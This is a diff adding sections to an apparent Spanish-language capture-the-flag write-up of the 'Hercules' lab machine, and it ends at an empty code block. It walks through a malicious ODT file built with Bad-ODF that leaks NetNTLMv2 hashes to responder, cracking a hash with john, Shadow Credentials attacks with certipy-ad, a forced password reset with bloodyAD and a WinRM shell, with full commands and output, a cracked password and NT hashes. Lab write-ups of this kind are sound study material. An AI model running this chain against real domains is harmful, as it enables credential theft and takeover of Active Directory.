@@ -1086,7 +1086,6 @@ project_dir = "legacy_auth_auto"
 program_cs = f"""using System;
 using AspNetCore.LegacyAuthCookieCompat;
 
-# Elimina las etiquetas {% raw %} y {% endraw %}
 {% raw %}
 public static class HexUtils
 {{
@@ -1283,24 +1282,533 @@ Ya tenemos una pista de lo que debemos hacer.
 
 <h2 id="MaliciousODT">Cargando Archivo ODT Malicioso para Capturar y Crackear Hash Net NTLMv2</h2>
 
+La idea es que podamos crear un **archivo ODT** malicioso que al momento de ser cargado, nos mande o una **Reverse Shell** o comparta el **Hash NTLMv2** del usuario que tenga nuestro archivo.
+
+La mejor opción es irnos por lo segundo.
+
 Ya hemos creado **archivos ODT** maliciosos de manera manual, pero podemos crearlos de manera automatizada usando el siguiente script:
 * <a href="https://github.com/lof1sec/Bad-ODF" target="_blank">Repositorio de lof1sec: Bad-ODF</a>
 
+Antes de poder usarlo, necesitamos tener instalada la **librería ezodf y lxml**.
 
+Podemos crear un ambiente virtual de **Python** para evitar cualquier mala configuración:
 ```bash
-
+python3 -m venv .venv
+source .venv/bin/activate
+pip install ezodf lxml
 ```
 
+Listo, ya puedes ejecutar el script de **Python Bad-ODF.py**:
 ```bash
+python3 Bad-ODF.py
+  / __ )____ _____/ /     / __ \/ __ \/ ____/
 
+    ____            __      ____  ____  ______
+   / __ )____ _____/ /     / __ \/ __ \/ ____/
+  / __  / __ `/ __  /_____/ / / / / / / /_    
+ / /_/ / /_/ / /_/ /_____/ /_/ / /_/ / __/    
+/_____/\__,_/\__,_/      \____/_____/_/     
+
+
+Create a malicious ODF document help leak NetNTLM Creds
+
+By Richard Davy 
+@rd_pentest
+www.secureyourit.co.uk
+
+
+Please enter IP of listener: Tu_IP
+                                                                                                                                                                                              
+ls
+Bad-ODF.py  bad.odt  README.md
+```
+Tan solo le dimos nuestra IP y ya nos crea el **archivo ODT** malicioso.
+
+Antes de cargarlo, vamos a abrir un listener con **responder**, para que haga la captura del **Hash NTLMv2**:
+```bash
+responder -I tun0
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+...
 ```
 
-```bash
+Ahora sí, carga el archivo malicioso en la página:
 
+<p align="center">
+<img src="/assets/images/htb-writeup-hercules/Captura26.png">
+</p>
+
+Espera un poco y observa el **responder**:
+```bash
+[SMB] NTLMv2-SSP Client   : 10.10.11.91
+[SMB] NTLMv2-SSP Username : HERCULES\natalie.a
+[SMB] NTLMv2-SSP Hash     : natalie.a::HERCULES:8...
+[*] Skipping previously captured hash for HERCULES\natalie.a
+[*] Skipping previously captured hash for HERCULES\natalie.a
+...
+```
+Obtuvimos el Hash del **usuario natalie.a**.
+
+Copialo y guardalo en un archivo de texto, luego usa **JohnTheRipper** para crackearlo:
+```bash
+nano natalieHash
+john -w:/usr/share/wordlists/rockyou.txt natalieHash
+Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+Will run 6 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Prettyprincess123! (natalie.a)     
+1g 0:00:00:11 DONE (2025-11-02 13:18) 0.08944g/s 958969p/s 958969c/s 958969C/s Princess<3..Pongo27
+Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
+Session completed.
+```
+Excelente, tenemos su contraseña.
+
+Podemos probarla con **netexec** y ver si funciona en **LDAP**:
+```bash
+nxc ldap 10.10.11.91 -u 'natalie.a' -p 'Prettyprincess123!' -k
+LDAP        10.10.11.91     389    DC               [*] None (name:DC) (domain:hercules.htb)
+LDAP        10.10.11.91     389    DC               [+] hercules.htb\natalie.a:Prettyprincess123!
+```
+Si funciona, pero no nos servira para ganar acceso a la máquina.
+
+<br>
+
+<h2 id="BloodHound">Investigando e Identificando Vector de Ataque con BloodHound</h2>
+
+Enumeremos el **AD** usando la herramienta **bloodhound-python**:
+```bash
+bloodhound-python -u ken.w -p 'change*th1s_p@ssw()rd!!' -c All -d hercules.htb -ns 10.10.11.91 --zip --use-ldap
+INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
+INFO: Found AD domain: hercules.htb
+INFO: Getting TGT for user
+INFO: Connecting to LDAP server: dc.hercules.htb
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 1 computers
+INFO: Connecting to LDAP server: dc.hercules.htb
+INFO: Found 49 users
+INFO: Found 62 groups
+INFO: Found 2 gpos
+INFO: Found 9 ous
+INFO: Found 19 containers
+```
+Analicemos toda la información que obtuvimos.
+
+Si investigamos al **usuario natalie.a**, veremos que pertenece al grupo **Web Support**:
+
+<p align="center">
+<img src="/assets/images/htb-writeup-hercules/Captura27.png">
+</p>
+
+Y dentro de este grupo, veremos que también esta el **usuario ken.w** y el **usuario johnathan.j**:
+
+<p align="center">
+<img src="/assets/images/htb-writeup-hercules/Captura28.png">
+</p>
+
+Observa que este grupo tiene el **permiso GenericWrite**.
+
+| **Permiso GenericWrite** |
+|:------------------------:|
+| *En Active Directory (AD), el permiso GenericWrite es un permiso de control de acceso (ACE) que otorga la capacidad de modificar la mayoría de los atributos de un objeto. En otras palabras, si una cuenta o grupo tiene GenericWrite sobre un objeto (usuario, grupo, equipo, etc.), puede cambiar muchos de sus valores, incluyendo algunos críticos como contraseñas, claves o miembros de grupos.* |
+
+<br>
+
+Entonces, nuestro **usuario natalie.a** puede modificar muchos de los atributos de estos 6 usuarios.
+
+Investigando las rutas más cortas a los **Domain Admins**, veremos que el **usuario auditor** tiene bastantes privilegios, siendo un objetivo potente al que podemos apuntar:
+
+<p align="center">
+<img src="/assets/images/htb-writeup-hercules/Captura29.png">
+</p>
+
+Este mismo usuario, pertenece al grupo **Remote Management Users**, que es el grupo que puede conectarse remotamente al **AD**:
+
+<p align="center">
+<img src="/assets/images/htb-writeup-hercules/Captura30.png">
+</p>
+
+Y ahí vemos a otro usuario llamado **ashley.b**, siendo otro posible usuario al que podemos apuntar.
+
+Podemos ver a que otros grupos pertenece el **usuario auditor** y los permisos que tiene sobre ellos:
+
+<p align="center">
+<img src="/assets/images/htb-writeup-hercules/Captura31.png">
+</p>
+
+Ahí podemos ver 2 grupos de nuestro interes, siendo el grupo **Helpdesk Administrators y Security Helpdesk**, pues ambos grupos tienen el **permiso ForceChangePassword** sobre el **usuario auditor**:
+
+| **Permiso ForceChangePassword** |
+|:-------------------------------:|
+| *ForceChangePassword (a veces mostrado como User-Force-Change-Password o Reset Password / Force change) es un “extended right” en Active Directory que permite a la identitdad que lo posee restablecer la contraseña de otro objeto (usuario o máquina) sin conocer la contraseña actual. En la práctica: si tienes ese derecho sobre la cuenta de victima, puedes fijar una nueva contraseña para victima y luego autenticarte como ella (o usarla según el tipo de cuenta).* |
+
+<br>
+
+Podemos revisar los usuarios que pertenecen al grupo **Security Helpdesk**:
+
+<p align="center">
+<img src="/assets/images/htb-writeup-hercules/Captura32.png">
+</p>
+
+Solo hay dos usuarios aquí:
+* El **usuario mark.s**.
+* Y el **usuario stephen.m**.
+
+Y vemos los usuarios que hay en el grupo **Helpdesk Administrators**:
+
+<p align="center">
+<img src="/assets/images/htb-writeup-hercules/Captura33.png">
+</p>
+
+Siendo que hay 6 usuarios aquí:
+* El **usuario jessica.e**.
+* El **usuario stephanie.w**.
+* El **usuario johanna.f**.
+* El **usuario heather.s**.
+* El **usuario camilla.b**.
+* Y el **usuario mikayla.a**.
+
+Lo interesante comienza cuando analizamos al **usuario bob.w**, pues podemos notar que como en otros usuarios, tiene un certificado de autenticación creado:
+
+<p align="center">
+<img src="/assets/images/htb-writeup-hercules/Captura34.png">
+</p>
+
+Observa que tenemos activo el grupo **Enterprise Key Admins** y vemos como se relaciona con todo el dominio:
+
+<p align="center">
+<img src="/assets/images/htb-writeup-hercules/Captura35.png">
+</p>
+
+Además, nuesro **usuario natalie.a**, también se le ha creado un certificado de autenticación:
+
+<p align="center">
+<img src="/assets/images/htb-writeup-hercules/Captura36.png">
+</p>
+
+Esto puede dar pie al **Shadow Credentials Attack Chain**.
+
+<br>
+
+<h2 id="Shadow">Aplicando Shadow Credentials Attack Chain para Ganar Acceso a la Máquina AD</h2>
+
+¿Qué es el **Shadow Credentials Attack Chain**?
+
+| **Shadow Credentials Attack Chain** |
+|:-----------------------------------:|
+| *Shadow Credentials attack chain (cadena de ataque de credenciales en la sombra) es una técnica de persistencia/privilegio en entornos Active Directory que aprovecha la capacidad legítima de Windows para autenticar con claves/certificados (p. ej. Windows Hello for Business / PKINIT) para inyectar una clave pública en un objeto AD (usuario o equipo) y luego autenticarse como ese objeto sin conocer su contraseña. Es una forma muy sigilosa de «puerta trasera» porque no depende de hashes/contraseñas normales y puede pasar desapercibida si no se auditan los atributos adecuados.* |
+
+<br>
+
+Te dejo estos blogs que explican como aplicar este ataque:
+* <a href="https://www.hackingarticles.in/shadow-credentials-attack/" target="_blank">Shadow Credentials Attack</a>
+* <a href="https://medium.com/@NightFox007/exploiting-and-detecting-shadow-credentials-and-msds-keycredentiallink-in-active-directory-9268a587d204" target="_blank">Exploiting and Detecting Shadow Credentials and msDS-KeyCredentialLink in Active Directory</a>
+
+Para realizar este ataque, ocuparemos la herramienta **certipy-ad**:
+
+| **certipy-ad** |
+|:--------------:|
+| *Certipy (paquete certipy-ad) es una herramienta ofensiva en Python diseñada para enumerar, analizar y abusar de Active Directory Certificate Services (AD CS). Se usa en auditorías/CTFs para detectar plantillas/CA mal configuradas y, cuando es posible, solicitar certificados, extraer claves/PKCS#12 (PFX) y autenticarse usando certificados (PKINIT) para escalar privilegios en un dominio Windows.* |
+
+<br>
+
+La idea es la siguiente:
+* Utilizar a nuestro **usuario natalie.a** para poder crear un certificado de autenticación valido del **usuario bob.w**, sin que tengamos su contraseña.
+* El objetivo es poder llegar al **usuario auditor** para poder ganar acceso a la máquina AD.
+* Quizá podamos usar al **usuario bob.w** para más enumeración.
+
+Para hacer esto, primero necesitamos un **TGT** del **usuario natalie.a**:
+```bash
+impacket-getTGT -dc-ip 10.10.11.91 hercules.htb/natalie.a:Prettyprincess123!
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Saving ticket in natalie.a.ccache
 ```
 
+Utilizamos el **archivo CCACHE** junto a la herramienta **certipy-ad**, para aplicar el ataque y podamos obtener un certificado válido y un **Hash NT** del **usuario bob.w**:
 ```bash
+KRB5CCNAME=natalie.a.ccache certipy-ad shadow auto -u natalie.a@hercules.htb -dc-host DC.hercules.htb -account bob.w -k
+Certipy  v5.0.3 - by Oliver Lyak (ly4k)
+...
+[*] Targeting user 'bob.w'
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID 'a85a19f2bdee48d08462a5a6b82b605c'
+[*] Adding Key Credential with device ID 'a85a19f2bdee48d08462a5a6b82b605c' to the Key Credentials for 'bob.w'
+[*] Successfully added Key Credential with device ID 'a85a19f2bdee48d08462a5a6b82b605c' to the Key Credentials for 'bob.w'
+[*] Authenticating as 'bob.w' with the certificate
+[*] Certificate identities:
+[*]     No identities found in this certificate
+[*] Using principal: 'bob.w@hercules.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'bob.w.ccache'
+[*] Wrote credential cache to 'bob.w.ccache'
+[*] Trying to retrieve NT hash for 'bob.w'
+[*] Restoring the old Key Credentials for 'bob.w'
+[*] Successfully restored the old Key Credentials for 'bob.w'
+[*] NT hash for 'bob.w': 8a65c74e8f0073babbfac6725c66cc3f
+```
+Funciono, tenemos un **Hash NT** del **usuario bob.w**.
 
+Creamos un nuevo **TGT**, pero ahora del **usuario bob.w**:
+```bash
+impacket-getTGT -dc-ip 10.10.11.91 -hashes :8a65c74e8f0073babbfac6725c66cc3f hercules.htb/bob.w
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Saving ticket in bob.w.ccache
+```
+Lo tenemos, ahora podemos usar el **TGT** de este usuario para otras cosas.
+
+Una de estas es enumerar el **AD** de nuevo, pero con la intención de ver que permisos de escritura tiene este usuario.
+
+<br>
+
+<h3 id="bloodyAD">Enumeración de AD Usando Herramienta bloodyAD y Hash NT del Usuario bob.w</h3>
+
+¿Para que sirve la herramienta **bloodyAD**?
+
+| **BloodyAD** |
+|:------------:|
+| *bloodyAD es un framework/“navaja suiza” para escalada de privilegios en Active Directory que se comunica directamente con controladores de dominio usando llamadas LDAP (y en algunos casos SAMR u otros RPCs) para enumerar, explotar y manipular objetos AD (usuarios, grupos, OUs, atributos, etc.). Está pensado para pentesters/rojo-teams y soporta varios métodos de autenticación (passwords claros, NTLM hashes, tickets Kerberos, certificados).* |
+
+<br>
+
+Y antes de avanzar más, este es un concepto clave que debemos tener bien claro:
+
+| **Access Control List (ACL)** |
+|:-----------------------------:|
+| *Es una lista de reglas de permisos que se asocia a un objeto en Active Directory (usuario, grupo, OU, computadora, etc.). Cada objeto del AD tiene una ACL que define quién puede hacer qué sobre ese objeto.* |
+
+<br>
+
+Utilicemos **bloodyAD** para enumerar los detalles del **usuario bob.w**, obteniendo solo los atributos que puede escribir este usuario:
+```bash
+KRB5CCNAME=bob.w.ccache bloodyAD -u 'bob.w' -p '' -d 'hercules.htb' --host DC.hercules.htb get writable --detail -k
+
+distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=hercules,DC=htb
+url: WRITE
+wWWHomePage: WRITE
+.
+# OU Engineering Department
+distinguishedName: OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb
+device: CREATE_CHILD
+ipNetwork: CREATE_CHILD
+msPKI-Key-Recovery-Agent: CREATE_CHILD
+...
+
+# OU Security Department
+distinguishedName: OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
+device: CREATE_CHILD
+ipNetwork: CREATE_CHILD
+msPKI-Key-Recovery-Agent: CREATE_CHILD
+...
+
+# OU Web Department
+distinguishedName: OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
+device: CREATE_CHILD
+ipNetwork: CREATE_CHILD
+msPKI-Key-Recovery-Agent: CREATE_CHILD
+...
+
+# Usuarios que pueden modificar OU Security Department
+distinguishedName: CN=Auditor,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
+name: WRITE
+cn: WRITE
+...
+distinguishedName: CN=Stephen Miller,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
+name: WRITE
+cn: WRITE
+...
+
+# Usuarios que pueden modificar OU Web Department
+distinguishedName: CN=Bob Wood,OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
+thumbnailPhoto: WRITE
+pager: WRITE
+mobile: WRITE
+homePhone: WRITE
+userSMIMECertificate: WRITE
+msDS-ExternalDirectoryObjectId: WRITE
+msDS-cloudExtensionAttribute20: WRITE
+...
+userCert: WRITE
+userCertificate: WRITE
+...
+```
+
+Del resultado de este comando, deje la mayoria de lo que es importante y lo resumo:
+* Tenemos **CREATE_CHILD** en **OUs** importantes (**Engineering, Security, Web**),es decir, podemos crear objetos dentro de esas **OUs**: usuarios y computers incluidos.
+* Tenemos **WRITE** sobre muchos atributos `userCertificate, userCert, msPKI*, msDS-AllowedToActOnBehalfOfOtherIdentity` (y similares) en usuarios concretos (ej. **CN=Bob Wood**), es deicr, podemos escribir/inyectar certificados o **tokens PKI** en el objeto de usuario.
+* Tenemos **WRITE** sobre `name / cn` de muchos usuarios (**Stephen Miller, Auditor**, etc.), es decir, podemos renombrar/ajustar atributos identificadores o manipular el `cn/name`.
+
+La diferencia entre los **OU**, es que el **OU Web Deparment**, es el más permisivo, ya que es quien nos permite crear los certificados de otros usuarios, sin que tengamos sus contraseñas.
+
+Recuerda que nuestro objetivo principal es llegar al **usuario auditor**, pero de momento, podemos aprovecharnos del **usuario stephen.m**.
+
+Para este usuario, que pertenece al grupo **Security Helpdesk**, podemos moverlo al **OU Web Department** para que herede **ACLs** más permisivas de este **OU**.
+
+Esto con el fin de que podamos obtener un certificado y **TGT** de el, para después abusar de sus **ACLs**, con tal de que podamos llegar al **usuario auditor** y nos podamos autenticar como este.
+
+<br>
+
+<h2 id="MovingToOU">Moviendo Usuario stephen.m al OU Web Department para Abusar de sus ACLs y Podamos Ganar Acceso al AD como Usuario Auditor</h2>
+
+Para que podamos mover a este usuario, tenemos que autenticarnos dentro de la máquina.
+
+Esto lo podemos hacer utilizando obteniendo una sesión de **LDAPS** con **PowerView**.
+
+Podemos instalarlo como una librería de **Python** de la siguiente manera:
+```bash
+pip install "git+https://github.com/aniqfakhrul/powerview.py"
+```
+
+Usando el mismo **TGT** del **usuario bob.w** y junto a **PowerView**, podemos obtener una sesión del **servicio LDAPS**, para evitar errores y bloqueos:
+```bash
+KRB5CCNAME=bob.w.ccache powerview hercules.htb/bob.w@dc.hercules.htb -k --use-ldaps -d --no-pass
+Logging directory is set to /root/.powerview/logs/hercules-bob.w-dc.hercules.htb
+[2025-10-25 00:37:06] [ConnectionPool] Started LDAP connection pool cleanup thread
+[2025-10-25 00:37:06] [ConnectionPool] Started LDAP connection pool keep-alive thread
+[2025-10-25 00:37:06] LDAP sign and seal are supported
+[2025-10-25 00:37:06] TLS channel binding is supported
+[2025-10-25 00:37:06] Authentication: SASL, User: bob.w@hercules.htb
+[2025-10-25 00:37:06] Connecting to dc.hercules.htb, Port: 636, SSL: True
+[2025-10-25 00:37:06] Using Kerberos Cache: bob.w.ccache
+[2025-10-25 00:37:06] SPN LDAP/DC.HERCULES.HTB@HERCULES.HTB not found in cache
+[2025-10-25 00:37:06] AnySPN is True, looking for another suitable SPN
+[2025-10-25 00:37:06] Returning cached credential for KRBTGT/HERCULES.HTB@HERCULES.HTB
+[2025-10-25 00:37:06] Using TGT from cache
+[2025-10-25 00:37:06] Trying to connect to KDC at dc.hercules.htb:88
+[2025-10-25 00:37:08] [Storage] Using cache directory: /root/.powerview/storage/ldap_cache
+[2025-10-25 00:37:08] [VulnerabilityDetector] Created default vulnerability rules at /root/.powerview/vulns.json
+[2025-10-25 00:37:08] [Get-DomainObject] Using search base: DC=hercules,DC=htb
+[2025-10-25 00:37:08] [Get-DomainObject] LDAP search filter: (&(1.2.840.113556.1.4.2=*)(|(samAccountName=bob.w)(name=bob.w)(displayName=bob.w)(objectSid=bob.w)(distinguishedName=bob.w)(dnsHostName=bob.w)(objectGUID=*bob.w*)))
+[2025-10-25 00:37:08] [ConnectionPool] LDAP added connection for domain: hercules.htb
+╭─LDAPS─[dc.hercules.htb]─[HERCULES\bob.w]-[NS:<auto>]
+╰─PV ❯
+```
+Estamos dentro.
+
+Ahora podemos mover a **stephen.m** al **OU Web Department**:
+```bash
+╭─LDAPS─[dc.hercules.htb]─[HERCULES\bob.w]-[NS:<auto>]
+╰─PV ❯ Set-DomainObjectDN -Identity stephen.m -DestinationDN 'OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb'
+[2025-10-25 00:37:24] [Get-DomainObject] Using search base: DC=hercules,DC=htb
+[2025-10-25 00:37:24] [Get-DomainObject] LDAP search filter: (&(1.2.840.113556.1.4.2=*)(|(samAccountName=stephen.m)(name=stephen.m)(displayName=stephen.m)(objectSid=stephen.m)(distinguishedName=stephen.m)(dnsHostName=stephen.m)(objectGUID=*stephen.m*)))
+[2025-10-25 00:37:24] [Get-DomainObject] Using search base: DC=hercules,DC=htb
+[2025-10-25 00:37:24] [Get-DomainObject] LDAP search filter: (&(1.2.840.113556.1.4.2=*)(distinguishedName=OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb))
+[2025-10-25 00:37:24] [Set-DomainObjectDN] Modifying CN=STEPHEN MILLER,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb object dn to OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
+[2025-10-25 00:37:24] [Set-DomainObject] Success! modified new dn for CN=STEPHEN MILLER,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
+```
+Funciono, esto hara que este usuario herede todos los **ACLs** de ese **OU**.
+
+Intentemos crear un certificado y **TGT** de **stephen.m**, pero necesitaremos nuevamente al **usuario natalie.a**.
+
+Creamos nuevamente el **TGT** del **usuario natalie.a**:
+```bash
+impacket-getTGT 'HERCULES.HTB/natalie.a:Prettyprincess123!'
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Saving ticket in natalie.a.ccache
+```
+
+Y ahora creamos el certificado del **usuario stephen.m** para obtener un **Hash NT**:
+```bash
+KRB5CCNAME=natalie.a.ccache certipy-ad shadow auto -u natalie.a@hercules.htb -dc-host DC.hercules.htb -account 'stephen.m' -k
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+...
+[*] Targeting user 'stephen.m'
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID '1682f000a782475d870db85936131460'
+[*] Adding Key Credential with device ID '1682f000a782475d870db85936131460' to the Key Credentials for 'stephen.m'
+[*] Successfully added Key Credential with device ID '1682f000a782475d870db85936131460' to the Key Credentials for 'stephen.m'
+[*] Authenticating as 'stephen.m' with the certificate
+[*] Certificate identities:
+[*]     No identities found in this certificate
+[*] Using principal: 'stephen.m@hercules.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'stephen.m.ccache'
+[*] Wrote credential cache to 'stephen.m.ccache'
+[*] Trying to retrieve NT hash for 'stephen.m'
+[*] Restoring the old Key Credentials for 'stephen.m'
+[*] Successfully restored the old Key Credentials for 'stephen.m'
+[*] NT hash for 'stephen.m': 9aaaedcb19e612216a2dac9badb3c210
+```
+Lo tenemos.
+
+Ya podemos crearle un **TGT**:
+```bash
+impacket-getTGT HERCULES.HTB/stephen.m -hashes :9aaaedcb19e612216a2dac9badb3c210
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Saving ticket in stephen.m.ccache
+```
+Recordemos que el grupo **Security Desktop**, donde estaba el **usuario stephen.m**, tiene el atributo **ForceChangePassword** sobre el **usuario auditor**.
+
+Entonces, podemos cambiarle la contraseña al usuario auditor, por una que queramos sin ninguna restricción:
+
+<p align="center">
+<img src="/assets/images/htb-writeup-hercules/Captura37.png">
+</p>
+
+<p align="center">
+<img src="/assets/images/htb-writeup-hercules/Captura38.png">
+</p>
+
+Podemos hacer esto con **bloodyAD**:
+```bash
+KRB5CCNAME=stephen.m.ccache bloodyAD --host DC.hercules.htb -d hercules.htb -u 'stephen.m' -k set password Auditor 'Prettyprincess123!'
+[+] Password changed successfully!
+```
+Listo, la cambiamos por la misma contraseña que tiene el **usuario natalie.a**.
+
+Creamos el **TGT** del **usuario auditor**:
+```bash
+impacket-getTGT -dc-ip 10.10.11.91 hercules.htb/Auditor:Prettyprincess123!
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Saving ticket in Auditor.ccache
+```
+
+Y para conectarnos, usaremos la herramienta **winrmexec**:
+* <a href="https://github.com/ozelis/winrmexec" target="_blank">Repositorio de ozelis: winrmexec</a>
+
+Clona el repositorio:
+```bash
+git clone https://github.com/ozelis/winrmexec.git
+```
+
+Lo ejecutamos usando el **TGT** del **usuario auditor**:
+```batch
+KRB5CCNAME=Auditor.ccache python3 winrmexec/evil_winrmexec.py -ssl -port 5986 -k -no-pass dc.hercules.htb
+...
+PS C:\Users\auditor\Documents> whoami
+hercules\auditor
+```
+Estamos dentro.
+
+En el directorio **Desktop**, encontraremos la flag del usuario:
+```batch
+PS C:\Users\auditor\Documents> cd ../Desktop
+PS C:\Users\auditor\Desktop> dir
+
+
+    Directory: C:\Users\auditor\Desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-ar---        10/25/2025  10:54 AM             34 user.txt
+
+
+PS C:\Users\auditor\Desktop> type user.txt
 ```
 
 
@@ -1313,6 +1821,456 @@ Ya hemos creado **archivos ODT** maliciosos de manera manual, pero podemos crear
 <br>
 
 
+<h2 id="FMigration">Asignando Dueño y Permiso GenericAll a Usuario Auditor sobre OU Forest Migration para Tener su Control Total</h2>
+
+Veamos a qué grupos pertenece este usuario:
+```bash
+PS C:\Users\auditor\Desktop> whoami /groups
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                 Type             SID                                           Attributes                                        
+========================================== ================ ============================================= ==================================================
+Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
+BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574                                  Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
+HERCULES\Domain Employees                  Group            S-1-5-21-1889966460-2597381952-958560702-1108 Mandatory group, Enabled by default, Enabled group
+HERCULES\Forest Management                 Group            S-1-5-21-1889966460-2597381952-958560702-1104 Mandatory group, Enabled by default, Enabled group
+Authentication authority asserted identity Well-known group S-1-18-1                                      Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
+```
+Observa que esta dentro del grupo **Forest Management**.
+
+| **Forest Management** |
+|:---------------------:|
+| *Es un grupo de seguridad en Active Directory (no es algo "de Microsoft" por defecto — es creado por administradores). Su propósito habitual: agrupar cuentas y servicios responsables de tareas a nivel de forest (gestión global, CA, replicación, cambios de esquema, migraciones, etc.). Miembros típicos: cuentas de administradores, service accounts para herramientas de gestión/migración.* |
+
+<br>
+
+Curiosamente, este grupo se relaciona con el **OU Forest Migration**:
+
+| **OU Forest Migration** |
+|:-----------------------:|
+| *Es una Organizational Unit (carpeta lógica) creada para operaciones de migración entre dominios/forests o para agrupar objetos temporales durante procesos administrativos. Su uso tipico es: Zona de staging para cuentas/objetos que se migran. Lugar donde se aplican GPOs/ACLs específicas usadas durante migraciones. Contiene cuentas de servicio o copias de objetos migrados hasta que se validen.* |
+
+<br>
+
+Estos dos tienen una relación operativa, donde el grupo **Forest Management** suele ser el equipo (o los accounts) que administran la **OU Forest Migration**.
+
+Podemos revisar que **ACLs** tiene el **OU Forest Migration** sobre el grupo **Forest Management**.
+
+Para esto, cargamos el módulo **ActiveDirectory** y ejecutamos el siguiente comando:
+```bash
+PS C:\Users\auditor\Desktop> Import-Module ActiveDirectory
+PS C:\Users\auditor\Desktop> (Get-ACL "AD:OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb").Access | Where-Object {$_.IdentityReference-like "*Forest Management*"} | Format-List *
+
+
+ActiveDirectoryRights : GenericRead
+InheritanceType       : All
+ObjectType            : 00000000-0000-0000-0000-000000000000
+InheritedObjectType   : 00000000-0000-0000-0000-000000000000
+ObjectFlags           : None
+AccessControlType     : Allow
+IdentityReference     : HERCULES\Forest Management
+IsInherited           : False
+InheritanceFlags      : ContainerInherit
+PropagationFlags      : None
+
+ActiveDirectoryRights : GenericAll
+InheritanceType       : None
+ObjectType            : 00000000-0000-0000-0000-000000000000
+InheritedObjectType   : 00000000-0000-0000-0000-000000000000
+ObjectFlags           : None
+AccessControlType     : Allow
+IdentityReference     : HERCULES\Forest Management
+IsInherited           : False
+InheritanceFlags      : None
+PropagationFlags      : None
+```
+
+Te explico el comando:
+* `Get-ACL "AD:OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb"`: Lee la **ACL** del **AD** cuyo path se pasa al proveedor **AD** de **PowerShell**. En este caso la **OU Forest Migration** dentro del contenedor **DCHERCULES** en el dominio **hercules.htb**. 
+* `.Access`: Del objeto **ACL** devuelve la colección de **ACE (Access Control Entries)**. Cada entrada que describe quién (**IdentityReference**) tiene qué permiso (**ActiveDirectoryRights**) sobre ese objeto.
+* `Where-Object { $_.IdentityReference -like "*Forest Management*" }`: Filtra las **ACEs** dejando solo aquellas cuyo **IdentityReference** (el sujeto al que se le aplica la **ACE**) coincide con la cadena **Forest Management**. Es decir: **ACEs** que afectan al grupo **Forest Management** (o cualquier objeto cuyo nombre contenga esa cadena).
+* `Format-List *`: Formatea la/s **ACE/s** resultantes mostrando todas sus propiedades (para que veas detalles como **IdentityReference, ActiveDirectoryRights, AccessControlType, ObjectType, InheritanceFlags, IsInherited**, etc.).
+
+<br>
+
+Del resultado, vemos que tenemos el permiso **GenericAll** sobre el **OU Forest Migration**, lo cual es bastante critico.
+
+Pues si asignamos ese permiso a nuestro usuario, tendremos control total sobre este **OU**, permitiendonos:
+* Manipular los objetos (usuarios) existentes en el **OU**. 
+* Crear nuevos objetos.
+* Capacidad para restablecer las contraseñas de usuario existentes y más.
+
+Podemos poner al **usuario auditor** como el duñeño del **OU Forest Migration** con **bloodyAD**:
+```bash
+KRB5CCNAME=Auditor.ccache bloodyAD --host DC.hercules.htb -d hercules.htb -u Auditor -p 'Prettyprincess123!' -k set owner 'OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB' Auditor
+[!] S-1-5-21-1889966460-2597381952-958560702-1128 is already the owner, no modification will be made
+```
+Aunque nos menciona que ya es dueño, siempre es importante asegurarnos.
+
+Ya solo le agregamos el permiso **GenericAll**:
+```bash
